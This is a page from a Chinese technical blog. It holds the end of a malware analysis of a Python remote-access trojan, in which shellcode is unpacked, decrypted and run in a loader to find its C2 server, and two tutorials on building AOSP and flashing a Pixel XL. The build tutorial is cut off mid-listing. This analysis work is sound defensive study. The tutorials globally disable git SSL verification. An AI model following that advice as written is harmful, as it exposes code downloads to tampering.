<h1 id="pyinstxtractor"><a href="#pyinstxtractor" class="headerlink" title="pyinstxtractor"></a>pyinstxtractor</h1><p>通过使用pyinstxtractor可以将python写的exe进行解包</p>
<p>项目地址: <a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a></p>
<p>需要使用对应的python版本进行解包才能解除相应的依赖包。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py xxx.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220716925.png" alt="图片"></p>
<h1 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h1><p>在线反编译工具: <a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
<p>提示反编译报错</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220725803.png" alt="图片"></p>
<p>猜测可能是文件头存在问题</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220732499.png" alt="图片"></p>
<p>使用其他可以成功反编译的pyc文件头进行填充，然后进行反编译。</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220741801.png" alt="图片"></p>
<p>反编译成功</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220748872.png" alt="图片"></p>
<h1 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h1><p>反编译后发现存在 buf1、buf2、buf3跟进进行查看</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220755885.png" alt="图片"></p>
<p>直接传入的位置 <code>loader.payload_loader(buf1+buf2+buf3)</code></p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220806051.png" alt="图片"></p>
<p>loader是引入的依赖，pyinstxtractor解包正确的话可以在XXX_extracted文件夹中找到依赖。</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220812882.png" alt="图片"></p>
<p>使用正确的Python版本解压</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220820173.png" alt="图片"></p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220825277.png" alt="图片"></p>
<p>复用dectry函数，解出shellcode。</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220831487.png" alt="图片"></p>
<p>有了原始的shellcode后，只需要将shellcode加载起来就可以得到对应的C2地址了。</p>
<p>通过使用scdbg获取shellcode加载后的C2回连</p>
<p>下载地址: <a target="_blank" rel="noopener" href="https://github.com/dzzie/VS_LIBEMU/releases">https://github.com/dzzie/VS_LIBEMU/releases</a></p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220843148.png" alt="图片"></p>
<p>使用shellcode加载器加载</p>
<p>下载地址: <a target="_blank" rel="noopener" href="https://github.com/k8gege/scrun">https://github.com/k8gege/scrun</a></p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220849635.png" alt="图片"></p>
<p>使用火绒剑查看回连的ip，但是这里的ip并不是一个准确的ip，因为C2的通讯使用了像CDN或云函数之类的方式。</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220855583.png" alt="图片"></p>
<p>当然最好的是可以使用wireshark方式抓包</p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/08/21/安卓系统定制-手机刷机/">安卓系统定制-手机刷机</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-08-21T13:53:56.000Z" itemprop="datePublished">2022-53-21</time>
</div>
      <div class="tags">标签: 

<a href="/tags/安卓系统定制/">安卓系统定制</a>
</div>
    </div>
      
        <p>上一篇文章中的步骤是针对 <code>Pixel(sailfish)</code>的手机，本篇文章使用的是 <code>PixelXL(Marlin)</code>，所以要注意下编译的安卓系统手机驱动的部分要选择使用的是 <code>Marlin</code>。</p>
<h1 id="刷机前的准备"><a href="#刷机前的准备" class="headerlink" title="刷机前的准备"></a>刷机前的准备</h1><h2 id="硬件设备"><a href="#硬件设备" class="headerlink" title="硬件设备"></a>硬件设备</h2><ul>
<li>Pixel XL（marlin）手机一部 - <strong>需要进行解锁，这里建议大家在咸鱼或淘宝买一部，价格270左右能买到，买时注意问下有没进行解锁。</strong></li>
<li>能连电脑和手机的数据线一条</li>
</ul>
<h2 id="Android套件"><a href="#Android套件" class="headerlink" title="Android套件"></a>Android套件</h2><p>这里下载一个AndroidStudio，通过这个来安装SDK。安装完成后，打开 <code>Preferences</code>。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215818982.png" alt="Image"></p>
<p>勾选对应的SDK，这里承接上文，选择SDK10。进行安装</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215836401.png" alt="Image"></p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215836387.png" alt="Image"></p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215836246.png" alt="Image"></p>
<p>安装完成后，在环境变量中添加如下信息(这里笔者使用的是Mac电脑只能提供Mac的了)，相信聪明的你应该知道咋配置。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ANDROID_HOME=/Users/xxx/Library/Android/sdk/</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$ANDROID_HOME</span>/platform-tools:<span class="variable">$ANDROID_HOME</span>/tools:<span class="variable">$PATH</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>SDK的路径在上边的AndroidStudio配置里能看到</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215916057.png" alt="Image"></p>
<p>输入 <code>fastboot--help</code>和 <code>adb--help</code>，能正常提示的话就是正常了，提示找不到命令的话就检查一下环境变量的配置。</p>
<h2 id="原厂镜像下载"><a href="#原厂镜像下载" class="headerlink" title="原厂镜像下载"></a>原厂镜像下载</h2><p>Google原厂镜像: <a target="_blank" rel="noopener" href="https://developers.google.com/android/images#marlin">https://developers.google.com/android/images#marlin</a></p>
<p>点击页面上的 <code>Acknowledge</code></p>
<p>选择对应的手机型号和Android版本，点击 <code>Link</code>进行下载。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215934436.png" alt="Image"></p>
<h1 id="进行刷机"><a href="#进行刷机" class="headerlink" title="进行刷机"></a>进行刷机</h1><p>将手机用数据线连接到电脑上，按照下边的步骤开启USB调试。</p>
<h2 id="USB调试"><a href="#USB调试" class="headerlink" title="USB调试"></a>USB调试</h2><p>开启开发者模式: 设置 -&gt; 关于手机 -&gt; 版本号(连续多次点击就可以开启开发者模式)</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220001598.png" alt="Image"></p>
<p>开启手机USB调试: 设置 -&gt; 系统 -&gt; 高级 -&gt; USB调试 -&gt; 在手机上点击弹出来要求进行授权的窗口。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220010945.png" alt="Image"></p>
<p>打开终端输入 <code>adb devices</code>，能正常显示出有一台设备即可。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220019400.png" alt="Image"></p>
<h2 id="进入bootloader模式"><a href="#进入bootloader模式" class="headerlink" title="进入bootloader模式"></a>进入bootloader模式</h2><p>注意这个过程<strong>不要拔掉数据线</strong>，打开命令行输入下边的命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure>

<p>或者将<strong>手机关机后同时按住手机电源键与音量减键</strong>，进入bootloader界面。注意下图中提示的 <code>UNLOCKED</code>，代表手机已经是解锁状态。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220112690.png" alt="Image"></p>
<h2 id="刷入系统"><a href="#刷入系统" class="headerlink" title="刷入系统"></a>刷入系统</h2><p>这里先使用Google下载的原厂镜像包进行刷机尝试，将下好的包进行解压，然后在手机连接电脑并处于bootloader模式下运行镜像包中的脚本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 ./flash-all.sh</span><br><span class="line">./flash-all.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220128971.png" alt="Image"></p>
<p>等待脚本执行完</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220139396.png" alt="Image"></p>
<p>此时正常刷入后，手机就会进入到初始化配置的界面，正常配置就可以了。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220201024.png" alt="Image"></p>
<h1 id="刷入定制的系统"><a href="#刷入定制的系统" class="headerlink" title="刷入定制的系统"></a>刷入定制的系统</h1><p>在上一篇文章中，我们已经介绍了如何进行系统编译，编译完成后在 <code>~/bin/aosp/out/target/product/手机代号/</code>文件夹下提取出以下几个文件。</p>
<ul>
<li>vendor.img</li>
<li>system_other.img</li>
<li>system.img</li>
<li>boot.img</li>
</ul>
<p>并将这些文件，放入原本解压出来的Google镜像包中的 <code>.zip</code>文件中，使用压缩包的方式打开这个 <code>.zip</code>文件，然后将文件拖拽进去。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220209549.png" alt="Image"></p>
<p>进行覆盖</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220217614.png" alt="Image"></p>
<p>之后按照前边的刷入系统的步骤再次打开usb调试，通过命令进入bootloader模式，然后运行flash-all.sh脚本即可。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220227606.png" alt="Image"></p>
<p>刷机完成后正常配置进入到桌面</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220241854.png" alt="Image"></p>
<p>可以看到系统的构建版本就是我们自己指定编译的安卓系统。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220255008.png" alt="Image"></p>
<p>之后的文章中会介绍如何通过自己定制的系统完成一些日常逆向中所需要的操作。</p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/08/21/安卓系统定制-系统编译/">安卓系统定制-系统编译</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-08-21T13:49:18.000Z" itemprop="datePublished">2022-49-21</time>
</div>
      <div class="tags">标签: 

<a href="/tags/安卓系统定制/">安卓系统定制</a>
</div>
    </div>
      
        <h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="Ubuntu系统安装"><a href="#Ubuntu系统安装" class="headerlink" title="Ubuntu系统安装"></a>Ubuntu系统安装</h2><p>下载一个Ubuntu-20.04.2.0-desktop系统，之后用来编译安卓系统用。将内存调到 <code>16g+</code>、磁盘 <code>500g+</code>。**(有单独不用的真机的话建议可以使用真机)**</p>
<ul>
<li><p>安装完成后进行如下几个操作</p>
</li>
<li><ul>
<li>关闭睡眠和锁屏 &#x3D; 点击右上角的设置 -&gt; 隐私 -&gt; 锁屏 -&gt; 取消自动锁屏</li>
<li>设置中文 &#x3D; Setting -&gt; Region &amp; Language -&gt; Manage Installed.. -&gt; 添加或删除 -&gt; 中文简体(Chinese Simplifed) -&gt; LogOut</li>
<li>更新下载源 &#x3D; 点击右上角的设置 -&gt; 关于 -&gt; 软件更新 -&gt; 修改”下载自”处位置</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装虚拟机和真机拖拽用的工具，真机可以忽略。</span></span><br><span class="line">sudo apt-get autoremove open-vm-tools</span><br><span class="line">sudo apt install open-vm-tools-desktop</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h2 id="AOSP源码下载"><a href="#AOSP源码下载" class="headerlink" title="AOSP源码下载"></a>AOSP源码下载</h2><p>这一步是准备安卓源码包，下边的步骤照着做就可以了，建议先玩转起来不要太过多纠结里边的一些概念。</p>
<h3 id="初始化包"><a href="#初始化包" class="headerlink" title="初始化包"></a>初始化包</h3><p>下载: aosp-20210601.tar 有点大119G</p>
<p><strong>因为Android的源码越来越大，直接使用repo sync失败的概率也越来越高。所以我们可以避开使用repo sync的方式，而采用下载初始化包的方式来实现下载源码。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/bin/</span><br><span class="line"><span class="built_in">cd</span> ~/bin/ <span class="comment"># 将下载好的tar包放在该目录下，并进行解压。</span></span><br><span class="line">tar xvf aosp-latest.tar</span><br></pre></td></tr></table></figure>

<h3 id="同步源码"><a href="#同步源码" class="headerlink" title="同步源码"></a>同步源码</h3><p>安装和配置git，之后需要用到。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br><span class="line">git config --global user.email aaa@qq.com</span><br><span class="line">git config --global user.name <span class="string">&quot;aaa&quot;</span></span><br><span class="line">git config --global http.sslverify <span class="literal">false</span></span><br><span class="line">git config --global https.sslverify <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>下载repo，repo是一个python脚本(所以还需要配置Python环境)，因为Android源码包含数百个git库，repo用于简化帮助管理AndroidGit版本库的工具。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH=~/bin:\$PATH&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo apt-get install curl</span><br><span class="line">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo -o ~/bin/repo</span><br><span class="line"><span class="built_in">chmod</span> a+x ~/bin/repo</span><br><span class="line"><span class="built_in">export</span> REPO_URL=<span class="string">&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> ~/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要用到python38</span></span><br><span class="line">sudo <span class="built_in">unlink</span> /usr/bin/python</span><br><span class="line">sudo <span class="built_in">ln</span> -s /usr/bin/python3.8 /usr/bin/python</span><br><span class="line"></span><br><span class="line"><span class="comment"># android版本可以在https://source.android.com/setup/build-numbers中查看，这里指定使用的源码是Android10的10.0.0_r17版</span></span><br><span class="line"><span class="comment"># 指定要同步的分支</span></span><br><span class="line">repo init -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-10.0.0_r17</span><br><span class="line"><span class="built_in">cd</span> ./aosp/</span><br><span class="line">repo <span class="built_in">sync</span> <span class="comment"># 正常同步完成后即可得到完整的android源码目录</span></span><br></pre></td></tr></table></figure>

<p>如果执行repo sync报如下错误</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">repo reset: error: Entry <span class="string">&#x27;.github/workflows/test-ci.yml&#x27;</span> not uptodate. Cannot merge.</span><br><span class="line">fatal: 不能重置索引文件至版本 <span class="string">&#x27;v2.22^0&#x27;</span>。</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215036702.png" alt="Image"></p>
<p>按照下边这个步骤进行解决</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp/.repo/repo</span><br><span class="line">git pull <span class="comment"># 同步仓库代码到最新</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回到aosp目录，重新同步一下源码。</span></span><br><span class="line"><span class="built_in">cd</span> ../../</span><br><span class="line">repo init -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-10.0.0_r17</span><br><span class="line">repo <span class="built_in">sync</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215048565.png" alt="Image"></p>
<p>这时候能看到aosp目录下就有对应版本的安卓源码</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215057870.png" alt="Image"></p>
<h1 id="系统编译"><a href="#系统编译" class="headerlink" title="系统编译"></a>系统编译</h1><p>完成上边的步骤之后，将可以尝试进行系统编译。在编译前需要安装一些系统的依赖</p>
<h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><p>Android7以上系统编译需要有Jdk8、以及一些系统上的依赖。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:openjdk-r/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他版本的ubuntu依赖,可以参考: https://source.android.com/setup/build/initializing?hl=zh-cn#next-download-the-source</span></span><br><span class="line">sudo apt-get install git-core gnupg flex bison build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 libncurses5 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig libncurses5</span><br></pre></td></tr></table></figure>

<h2 id="手机驱动"><a href="#手机驱动" class="headerlink" title="手机驱动"></a>手机驱动</h2><p>根据自己的手机设备和Android系统版本，来选择对应的手机驱动。</p>
<p>下载地址: <a target="_blank" rel="noopener" href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a></p>
<p>对应系统具体的构建ID查询: <a target="_blank" rel="noopener" href="https://source.android.com/setup/build-numbers">https://source.android.com/setup/build-numbers</a></p>
<p>这里根据上文，这里选择使用的驱动 <code>PixelbinariesforAndroid10.0.0(QP1A.191005.007.A3)</code>。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215115851.png" alt="Image"></p>
<p><strong>下载这2个文件，并将这两个压缩包文件上传放置&#x2F;aosp&#x2F;目录下，并解压执行里边的shell脚本。</strong>需要注意的是Shell脚本会要求你输入 <code>I ACCEPT</code>，这个大概在第8条左右的规则那里。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/bin/aosp/</span><br><span class="line"><span class="built_in">chmod</span> 777 ./extract-google_devices-sailfish.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 ./extract-qcom-sailfish.sh</span><br><span class="line">./extract-google_devices-sailfish.sh <span class="comment"># 注意要输入 I ACCEPT</span></span><br><span class="line">./extract-qcom-sailfish.sh <span class="comment"># 注意要输入 I ACCEPT</span></span><br><span class="line"><span class="comment"># 执行完后就可以将这文件删除</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215136359.png" alt="Image"></p>
<p>上述步骤操作完成后，<strong>需要查看一下源码中有没手机对应的设备内核。</strong></p>
<p>内核存放位置参考: <a target="_blank" rel="noopener" href="https://source.android.google.cn/setup/build/building-kernels#id-version">https://source.android.google.cn/setup/build/building-kernels#id-version</a></p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215147875.png" alt="Image"></p>
<p><strong>如果没有对应的内核，则按照文档中的步骤进行构建内核，一般都会有的！</strong></p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215152551.png" alt="Image"></p>
<h2 id="进行编译"><a href="#进行编译" class="headerlink" title="进行编译"></a>进行编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/bin/aosp/</span><br><span class="line">make clobber <span class="comment"># 清理，一套Android源码可以编译不同的机型，想要更换机形，需要执行该清理动作。</span></span><br><span class="line"><span class="built_in">source</span> build/envsetup.sh <span class="comment"># 执行配置一些环境遍历，下边的命令想要使用就要通过这个脚本进行环境变量配置。</span></span><br><span class="line">lunch <span class="comment"># 选择需要编译的设备内核和编译版本</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>版本类型</p>
</li>
<li><ul>
<li>xxx-user 没有root权限。</li>
<li>xxx-userdebug adbd有root权限，需要手动su。</li>
<li>xxx-eng adbd完全root权限。</li>
</ul>
</li>
<li><p>手机代号</p>
</li>
<li><ul>
<li>sailfish 指的就是 Pixel 手机</li>
<li>可在 <a target="_blank" rel="noopener" href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a> 上进行查询</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">You<span class="string">&#x27;re building on Linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Lunch menu... pick a combo:</span></span><br><span class="line"><span class="string">     1. aosp_arm-eng</span></span><br><span class="line"><span class="string">     2. aosp_arm64-eng</span></span><br><span class="line"><span class="string">     3. aosp_blueline-userdebug</span></span><br><span class="line"><span class="string">     4. aosp_bonito-userdebug</span></span><br><span class="line"><span class="string">     5. aosp_car_arm-userdebug</span></span><br><span class="line"><span class="string">     6. aosp_car_arm64-userdebug</span></span><br><span class="line"><span class="string">     7. aosp_car_x86-userdebug</span></span><br><span class="line"><span class="string">     8. aosp_car_x86_64-userdebug</span></span><br><span class="line"><span class="string">     9. aosp_cf_arm64_phone-userdebug</span></span><br><span class="line"><span class="string">     10. aosp_cf_x86_64_phone-userdebug</span></span><br><span class="line"><span class="string">     11. aosp_cf_x86_auto-userdebug</span></span><br><span class="line"><span class="string">     12. aosp_cf_x86_phone-userdebug</span></span><br><span class="line"><span class="string">     13. aosp_cf_x86_tv-userdebug</span></span><br><span class="line"><span class="string">     14. aosp_crosshatch-userdebug</span></span><br><span class="line"><span class="string">     15. aosp_marlin-userdebug</span></span><br><span class="line"><span class="string">     16. aosp_sailfish-userdebug</span></span><br><span class="line"><span class="string">     17. aosp_sargo-userdebug</span></span><br><span class="line"><span class="string">     18. aosp_taimen-userdebug</span></span><br><span class="line"><span class="string">     19. aosp_walleye-userdebug</span></span><br><span class="line"><span class="string">     20. aosp_walleye_test-userdebug</span></span><br><span class="line"><span class="string">     21. 